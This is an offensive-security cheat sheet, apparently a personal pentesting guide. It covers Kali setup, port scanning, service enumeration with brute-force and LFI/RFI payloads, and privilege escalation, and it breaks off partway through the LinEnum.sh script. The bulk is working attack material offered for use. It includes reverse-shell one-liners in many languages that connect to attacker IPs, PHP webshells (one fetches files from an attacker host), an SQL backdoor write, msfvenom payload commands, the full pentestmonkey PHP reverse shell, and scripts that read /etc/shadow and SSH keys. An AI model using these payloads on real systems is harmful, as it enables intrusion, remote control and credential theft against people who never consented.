# a no-bullshit offsec guide 

### disclaimer:
The information on this website is for educational purposes only. The author of this work will not be held accountable for any use or misuse of the information on this website. As there is always some risk involved, the author is not responsible for any effects or consequences from the use of any suggestions, recommendations, or procedures described herein. 


## dump windows 
 

- linux is open source, that means you have millions of lines of code at your disposal for free.

- modular applications and libraries in linux 

- super fast boot time

- no annoying updates 

- lightening fast on low ram

- free

- portable, yes even on a usb

- secure

- most tools are written in linux

- most web servers run in linux due to its stability


- easier to use than mainstream opinion


i use kali linux by offensive security. you can either use it on a virtualization software like virtualbox/vmware or use it as a partition along with your host os.

[1. installation guide for virtualization](https://phoenixnap.com/kb/how-to-install-kali-linux-on-virtualbox)

[2. installation guide for main os](https://techsprobe.com/how-to-install-kali-linux-2020-on-a-laptop-pc/)

## secure your kali installation

- change your default root password

- change your default ssh keys

- add an unprivileged user to work on, give it sudo rights with a password

- change your mac address with macchanger

- install tor and proxychains

- install anonsurf

- check open ports on your localhost (sudo ss -tulwn)

- close unnecessary ports/services (sudo service <service name> stop)


[1. guide to secure kali](https://alphacybersecurity.tech/how-to-secure-your-kali-linux-machine/)

[2. guide to secure kali further](https://thehacktoday.com/how-to-protect-yourself-while-hacking-in-kali-linux/)




**## the methodology i follow**


**- initial scoping**

**recon**

**enumerate -> exploit**

**reverse shell**

**upgrade shell**

**enumerate the target**

**escalate privileges and gain root**


## scoping
clearly understand which targets your have permission to scan/attack, do not break the law as it would hamper your reputation as a security researcher

## recon

recon wide to gather information on as many potential attack surfaces as possible

### 1. masscan

fast full port scanner
```
masscan -i tun0 -p1-65535 --rate=1000 IP
```
  
### 2. nmap

this handy little tool lets you see which ports are open on the target along with other information about the target

```
nmap -sTV -v -p- IP
sudo nmap -sU -v IP

 ``` 
 
 ### 3. nmapAutomater
 
a useful script to automate the scanning process

```
 ./nmapAutomater.sh IP All
 ./nmapAutomater.sh IP Vulns
 ./nmapAutomater.sh IP Quick
 ./nmapAutomater.sh IP Full
```

shoutout to @21y4d for this

[check it out on github here](https://github.com/21y4d/nmapAutomator/blob/master/nmapAutomator.sh)

## enumerate -> exploit

upgrade searchsploit 

```
searchsploit -u
searchsploit <service>

google site:exploitdb <service version>
google service version exploit
```

### 1. HTTP  80, 8000, 8080

```
nikto -h IP
curl -i http(s)://IP/robots.txt
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.18 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -V
```

- fire up dirbuster with a medium wordlist

- browse the site with a burpsuite proxy running

- look for SQL injection parameters in GET/POST

- LFI with ?file=foo parameter

- /etc/passwd /etc/shadow

- /var/www/html/config.php

- ?page=php://filter/convert.base64-encode/resource=../config.php

- ../../../../../boot.ini for version
- http://target.com/?page=./../../../../../../../../../etc/passwd%00

- RFI backdoor

- access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php

- phpinfo()

- password bruteforce

```
- <?php include $_GET['inc']; ?>
```



### 2. HTTPS 443

```
sslscan https://192.168.1.10/
```
- check out potential usernames in the ssl cert and the correct vhost
- look for heartbleed vuln

### 3. FTP 21 TFTP UDP 69

```
ftp IP
anonymous:anonymous
nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn IP

```
- anonymous login
- vulns in version
- traverse filesystem look for password files, system configs, BOF targets, OS version
- check upload potential



### 4. SMB 139,445

```
enum4linux -a IP
smbclient -L IP
locate *.nse | grep smb
nmap -p 139,445 --script=$scriptname IP
nmap -p 139,445 --script=smb-vuln* IP -v
enum4linux -a $targetip
enum4linux -a $targetip
smbmap -H $targetip
smbclient \\\\IP\\tmp
rpcclient -U "" -N 10.10.10.3
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
smbmap -H IP -u tyler -p '92g!mA8BGjOirkL%OG*&'
nbtscan -r IP/24
sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* IP
psexec to login to samba
smbclient -L 192.168.1.10
smbclient \\IP\ipc$ -U administrator
smbclient //IP/ipc$ -U administrator
smbclient //IP/admin$ -U administrator

```
-check if exploitable by msf


### 4. SNMP UDP 161

```
snmp-check
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
onesixtyone -c community -i ips
snmpwalk -c public -v1 IP
snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
```

### 5. SSH 22

-usually a secondary access point

### 6. SMTP/Email 25, 110/995 or 143/993

```
nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn IP

telnet IP 110
USER user
PASS pass

LIST
RETR message number
QUIT
```
- useful for enumerating users
- check versions and use searchsploit



### 7. LDAP 389

```
ldapsearch -x -h IP -p389 -s base namingcontexts
nmap -p 389 --script ldap-search IP
```

### 8. DNS 53

modify /etc/hosts file for individual dns resolution
modify /etc/resolv.conf for nameserver resolution overall
```
nslookup
SERVER <ip>
<ip>

dig axfr subdomain @IP
```


### 9. RPC 135

-metasploit exploit for ms-rpc: exploit/windows/dcerpc/ms05_017_msmq
```
nmap -n -v -sV -Pn -p 135 --script=msrpc-enum IP 
```


### 10. MySQL 3306

```
nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP

mysql --host=IP -u root -p
```

## reverse shell

- creating a php backdoor shell

```
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=4444 -f raw
```

- bash 

```
bash -i >& /dev/tcp/10.10.14.40/4444 0>&1
```

- perl

```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- php

```
php -r '$sock=fsockopen("10.10.14.42",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- php rce

```
<?php echo system($_REQUEST['zu']); ?>
```

- php one liner

```
<?php exec("/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.40/4444 0>&1’"); ?>
```

- php webshell one liner

```
<?php system($_REQUEST['cmd']); ?>
```

- php webshell for windows, upload and execute

```
<?php
  if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.42:8000/" . $_REQUEST['fupload']));
  };

  if (isset($_REQUEST['fexec'])) {
    echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
  };
?>
EOF;
```

- phpadmin shell

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

- ruby

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- netcat

```
nc -e /bin/sh 10.0.0.1 1234
```

- netcat for outdated systems

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
```

- netcat for windows

```
nc64.exe 10.10.14.42 4444 -e cmd.exe
```

- java

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f war > zuk3y.war
```
- SUID C Shell

```
int main(void){

setresuid(0, 0, 0);

system("/bin/bash");

}
```

- iis aspx reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```

- php web shell
shoutout to www.pentestmonkey.net
```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.23';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

## upgrading shell 

- upgrade reverse shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
```
- find your own term value: ```echo $TERM```
- export your term value```export TERM=<your own term value>```
- ctrl+z to background the shell
- enable passing keyboard shorcuts```stty raw -echo```
- foreground the process:```fg```
- reset ```reset```

## privilege escalation

### linux

```
sudo -l
uname -ar
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {}\;
cat /proc/version
cat /etc/issue
find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```
- linenum.sh

```
#!/bin/bash
#A script to enumerate local information from a Linux host
version="version 0.95"
#@rebootuser

#help function
usage () 
{ 
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m"
echo -e "\e[00;31m#########################################################\e[00m"
echo -e "\e[00;33m# www.rebootuser.com | @rebootuser \e[00m"
echo -e "\e[00;33m# $version\e[00m\n"
echo -e "\e[00;33m# Example: ./LinEnum.sh -k keyword -r report -e /tmp/ -t \e[00m\n"

		echo "OPTIONS:"
		echo "-k	Enter keyword"
		echo "-e	Enter export location"
		echo "-s 	Supply user password for sudo checks (INSECURE)"
		echo "-t	Include thorough (lengthy) tests"
		echo "-r	Enter report name" 
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e "\e[00;31m#########################################################\e[00m"		
}
header()
{
echo -e "\n\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;31m#\e[00m" "\e[00;33mLocal Linux Enumeration & Privilege Escalation Script\e[00m" "\e[00;31m#\e[00m" 
echo -e "\e[00;31m#########################################################\e[00m" 
echo -e "\e[00;33m# www.rebootuser.com\e[00m" 
echo -e "\e[00;33m# $version\e[00m\n" 

}

debug_info()
{
echo "[-] Debug Info" 

if [ "$keyword" ]; then 
	echo "[+] Searching for the keyword $keyword in conf, php, ini and log files" 
fi

if [ "$report" ]; then 
	echo "[+] Report name = $report" 
fi

if [ "$export" ]; then 
	echo "[+] Export location = $export" 
fi

if [ "$thorough" ]; then 
	echo "[+] Thorough tests = Enabled" 
else 
	echo -e "\e[00;33m[+] Thorough tests = Disabled\e[00m" 
fi

sleep 2

if [ "$export" ]; then
  mkdir $export 2>/dev/null
  format=$export/LinEnum-export-`date +"%d-%m-%y"`
  mkdir $format 2>/dev/null
fi

if [ "$sudopass" ]; then 
  echo -e "\e[00;35m[+] Please enter password - INSECURE - really only for CTF use!\e[00m"
  read -s userpassword
  echo 
fi

who=`whoami` 2>/dev/null 
echo -e "\n" 

echo -e "\e[00;33mScan started at:"; date 
echo -e "\e[00m\n" 
}

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='nmap\|perl\|awk\|find\|bash\|sh\|man\|more\|less\|vi\|emacs\|vim\|nc\|netcat\|python\|ruby\|lua\|irb\|tar\|zip\|gdb\|pico\|scp\|git\|rvim\|script\|ash\|csh\|curl\|dash\|ed\|env\|expect\|ftp\|sftp\|node\|php\|rpm\|rpmquery\|socat\|strace\|taskset\|tclsh\|telnet\|tftp\|wget\|wish\|zsh\|ssh$\|ip$\|arp\|mtr'

system_info()
{
echo -e "\e[00;33m### SYSTEM ##############################################\e[00m" 

#basic kernel info
unameinfo=`uname -a 2>/dev/null`
if [ "$unameinfo" ]; then
  echo -e "\e[00;31m[-] Kernel information:\e[00m\n$unameinfo" 
  echo -e "\n" 
fi

procver=`cat /proc/version 2>/dev/null`
if [ "$procver" ]; then
  echo -e "\e[00;31m[-] Kernel information (continued):\e[00m\n$procver" 
  echo -e "\n" 
fi

#search all *-release files for version info
release=`cat /etc/*-release 2>/dev/null`
if [ "$release" ]; then
  echo -e "\e[00;31m[-] Specific release information:\e[00m\n$release" 
  echo -e "\n" 
fi

#target hostname info
hostnamed=`hostname 2>/dev/null`
if [ "$hostnamed" ]; then
  echo -e "\e[00;31m[-] Hostname:\e[00m\n$hostnamed" 
  echo -e "\n" 
fi
}

user_info()
{
echo -e "\e[00;33m### USER/GROUP ##########################################\e[00m" 

#current user details
currusr=`id 2>/dev/null`
if [ "$currusr" ]; then
  echo -e "\e[00;31m[-] Current user/group info:\e[00m\n$currusr" 
  echo -e "\n"
fi

#last logged on user information
lastlogedonusrs=`lastlog 2>/dev/null |grep -v "Never" 2>/dev/null`
if [ "$lastlogedonusrs" ]; then
  echo -e "\e[00;31m[-] Users that have previously logged onto the system:\e[00m\n$lastlogedonusrs" 
  echo -e "\n" 
fi

#who else is logged on
loggedonusrs=`w 2>/dev/null`
if [ "$loggedonusrs" ]; then
  echo -e "\e[00;31m[-] Who else is logged on:\e[00m\n$loggedonusrs" 
  echo -e "\n"
fi

#lists all id's and respective group(s)
grpinfo=`for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null`
if [ "$grpinfo" ]; then
  echo -e "\e[00;31m[-] Group memberships:\e[00m\n$grpinfo"
  echo -e "\n"
fi

#added by phackt - look for adm group (thanks patrick)
adm_users=$(echo -e "$grpinfo" | grep "(adm)")
if [[ ! -z $adm_users ]];
  then
    echo -e "\e[00;31m[-] It looks like we have some admin users:\e[00m\n$adm_users"
    echo -e "\n"
fi

#checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)
hashesinpasswd=`grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null`
if [ "$hashesinpasswd" ]; then
  echo -e "\e[00;33m[+] It looks like we have password hashes in /etc/passwd!\e[00m\n$hashesinpasswd" 
  echo -e "\n"
fi

#contents of /etc/passwd
readpasswd=`cat /etc/passwd 2>/dev/null`
if [ "$readpasswd" ]; then
  echo -e "\e[00;31m[-] Contents of /etc/passwd:\e[00m\n$readpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/passwd $format/etc-export/passwd 2>/dev/null
fi

#checks to see if the shadow file can be read
readshadow=`cat /etc/shadow 2>/dev/null`
if [ "$readshadow" ]; then
  echo -e "\e[00;33m[+] We can read the shadow file!\e[00m\n$readshadow" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readshadow" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/shadow $format/etc-export/shadow 2>/dev/null
fi

#checks to see if /etc/master.passwd can be read - BSD 'shadow' variant
readmasterpasswd=`cat /etc/master.passwd 2>/dev/null`
if [ "$readmasterpasswd" ]; then
  echo -e "\e[00;33m[+] We can read the master.passwd file!\e[00m\n$readmasterpasswd" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$readmasterpasswd" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/master.passwd $format/etc-export/master.passwd 2>/dev/null
fi

#all root accounts (uid 0)
superman=`grep -v -E "^#" /etc/passwd 2>/dev/null| awk -F: '$3 == 0 { print $1}' 2>/dev/null`
if [ "$superman" ]; then
  echo -e "\e[00;31m[-] Super user account(s):\e[00m\n$superman"
  echo -e "\n"
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "\e[00;31m[-] Sudoers configuration (condensed):\e[00m$sudoers"
  echo -e "\n"
fi

if [ "$export" ] && [ "$sudoers" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
fi

#can we sudo without supplying a password
sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
if [ "$sudoperms" ]; then
  echo -e "\e[00;33m[+] We can sudo without supplying a password!\e[00m\n$sudoperms" 
  echo -e "\n"
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      if [ "$sudoauth" ]; then
        echo -e "\e[00;33m[+] We can sudo when supplying a password!\e[00m\n$sudoauth" 
        echo -e "\n"
      fi
    fi
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      if [ "$sudopermscheck" ]; then
        echo -e "\e[00;33m[-] Possible sudo pwnage!\e[00m\n$sudopermscheck" 
        echo -e "\n"
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "\e[00;33m[+] Possible sudo pwnage!\e[00m\n$sudopwnage" 
  echo -e "\n"
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "\e[00;31m[-] Accounts that have recently used sudo:\e[00m\n$whohasbeensudo" 
  echo -e "\n"
fi

#checks to see if roots home directory is accessible
rthmdir=`ls -ahl /root/ 2>/dev/null`
if [ "$rthmdir" ]; then
  echo -e "\e[00;33m[+] We can read root's home directory!\e[00m\n$rthmdir" 
  echo -e "\n"
fi

#displays /home directory permissions - check if any are lax
homedirperms=`ls -ahl /home/ 2>/dev/null`
if [ "$homedirperms" ]; then
  echo -e "\e[00;31m[-] Are permissions on /home directories lax:\e[00m\n$homedirperms" 
  echo -e "\n"
fi

#looks for files we can write to that don't belong to us
if [ "$thorough" = "1" ]; then
  grfilesall=`find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$grfilesall" ]; then
    echo -e "\e[00;31m[-] Files not owned by user but writable by group:\e[00m\n$grfilesall" 
    echo -e "\n"
  fi
fi

#looks for files that belong to us
if [ "$thorough" = "1" ]; then
  ourfilesall=`find / -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$ourfilesall" ]; then
    echo -e "\e[00;31m[-] Files owned by our user:\e[00m\n$ourfilesall"
    echo -e "\n"
  fi
fi

#looks for hidden files
if [ "$thorough" = "1" ]; then
  hiddenfiles=`find / -name ".*" -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
  if [ "$hiddenfiles" ]; then
    echo -e "\e[00;31m[-] Hidden files:\e[00m\n$hiddenfiles"
    echo -e "\n"
  fi
fi

#looks for world-reabable files within /home - depending on number of /home dirs & files, this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
wrfileshm=`find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null`
	if [ "$wrfileshm" ]; then
		echo -e "\e[00;31m[-] World-readable files within /home:\e[00m\n$wrfileshm" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$wrfileshm" ]; then
		mkdir $format/wr-files/ 2>/dev/null
		for i in $wrfileshm; do cp --parents $i $format/wr-files/ ; done 2>/dev/null
	fi
fi

#lists current user's home directory contents
if [ "$thorough" = "1" ]; then
homedircontents=`ls -ahl ~ 2>/dev/null`
	if [ "$homedircontents" ] ; then
		echo -e "\e[00;31m[-] Home directory contents:\e[00m\n$homedircontents" 
		echo -e "\n" 
	fi
fi

#checks for if various ssh files are accessible - this can take some time so is only 'activated' with thorough scanning switch
if [ "$thorough" = "1" ]; then
sshfiles=`find / \( -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" \) -exec ls -la {} 2>/dev/null \;`
	if [ "$sshfiles" ]; then
		echo -e "\e[00;31m[-] SSH keys/host information found in the following locations:\e[00m\n$sshfiles" 
		echo -e "\n"
	fi
fi

if [ "$thorough" = "1" ]; then
	if [ "$export" ] && [ "$sshfiles" ]; then
		mkdir $format/ssh-files/ 2>/dev/null
		for i in $sshfiles; do cp --parents $i $format/ssh-files/; done 2>/dev/null
	fi
fi

#is root permitted to login via ssh
sshrootlogin=`grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" | awk '{print  $2}'`
if [ "$sshrootlogin" = "yes" ]; then
  echo -e "\e[00;31m[-] Root is allowed to login via SSH:\e[00m" ; grep "PermitRootLogin " /etc/ssh/sshd_config 2>/dev/null | grep -v "#" 
  echo -e "\n"
fi
}

environmental_info()
{
echo -e "\e[00;33m### ENVIRONMENTAL #######################################\e[00m" 

#env information
envinfo=`env 2>/dev/null | grep -v 'LS_COLORS' 2>/dev/null`
if [ "$envinfo" ]; then
  echo -e "\e[00;31m[-] Environment information:\e[00m\n$envinfo" 
  echo -e "\n"
fi

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "\e[00;31m[-] SELinux seems to be present:\e[00m\n$sestatus"
  echo -e "\n"
fi

#phackt

#current path configuration
pathinfo=`echo $PATH 2>/dev/null`
if [ "$pathinfo" ]; then
  echo -e "\e[00;31m[-] Path information:\e[00m\n$pathinfo" 
  echo -e "\n"
fi

#lists available shells
shellinfo=`cat /etc/shells 2>/dev/null`
if [ "$shellinfo" ]; then
  echo -e "\e[00;31m[-] Available shells:\e[00m\n$shellinfo" 
  echo -e "\n"
fi

#current umask value with both octal and symbolic output
umaskvalue=`umask -S 2>/dev/null & umask 2>/dev/null`
if [ "$umaskvalue" ]; then
  echo -e "\e[00;31m[-] Current umask value:\e[00m\n$umaskvalue" 
  echo -e "\n"
fi

#umask value as in /etc/login.defs
umaskdef=`grep -i "^UMASK" /etc/login.defs 2>/dev/null`
if [ "$umaskdef" ]; then
  echo -e "\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n$umaskdef" 
  echo -e "\n"
fi

#password policy information as stored in /etc/login.defs
logindefs=`grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null`
if [ "$logindefs" ]; then
  echo -e "\e[00;31m[-] Password and storage information:\e[00m\n$logindefs" 
  echo -e "\n"
fi

if [ "$export" ] && [ "$logindefs" ]; then
  mkdir $format/etc-export/ 2>/dev/null
  cp /etc/login.defs $format/etc-export/login.defs 2>/dev/null
fi
}

job_info()
{
echo -e "\e[00;33m### JOBS/TASKS ##########################################\e[00m" 

#are there any cron jobs configured
cronjobs=`ls -la /etc/cron* 2>/dev/null`
if [ "$cronjobs" ]; then
  echo -e "\e[00;31m[-] Cron jobs:\e[00m\n$cronjobs" 
  echo -e "\n"
fi

#can we manipulate these jobs in any way
cronjobwwperms=`find /etc/cron* -perm -0002 -type f -exec ls -la {} \; -exec cat {} 2>/dev/null \;`
if [ "$cronjobwwperms" ]; then
  echo -e "\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n$cronjobwwperms" 
  echo -e "\n"
fi

#contab contents
crontabvalue=`cat /etc/crontab 2>/dev/null`
if [ "$crontabvalue" ]; then
  echo -e "\e[00;31m[-] Crontab contents:\e[00m\n$crontabvalue" 
  echo -e "\n"
fi

crontabvar=`ls -la /var/spool/cron/crontabs 2>/dev/null`
if [ "$crontabvar" ]; then
  echo -e "\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n$crontabvar" 
  echo -e "\n"
fi

anacronjobs=`ls -la /etc/anacrontab 2>/dev/null; cat /etc/anacrontab 2>/dev/null`
if [ "$anacronjobs" ]; then
  echo -e "\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n$anacronjobs" 
  echo -e "\n"
fi

anacrontab=`ls -la /var/spool/anacron 2>/dev/null`
if [ "$anacrontab" ]; then
  echo -e "\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n$anacrontab" 
  echo -e "\n"
fi

#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)
cronother=`cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null`
if [ "$cronother" ]; then
